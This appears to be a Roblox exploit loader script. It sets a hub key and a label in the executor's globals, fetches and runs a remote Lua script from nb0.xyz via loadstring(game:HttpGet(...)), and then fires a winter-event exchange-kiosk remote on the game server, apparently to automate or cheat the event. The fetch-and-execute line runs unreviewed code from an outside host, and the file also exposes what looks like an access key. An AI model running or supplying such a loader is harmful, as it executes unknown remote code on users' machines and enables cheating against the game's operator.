getgenv().hub_key = "4d964454191739793dcfa2a29ed7193a"
getgenv().custom_label = "VPS1"
loadstring(game:HttpGet("https://nb0.xyz/scripts/2G_FROSTCLAW_2024.lua"))()
wait(5)
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("WinterEventAPI/UseExchangeKiosk"):InvokeServer()
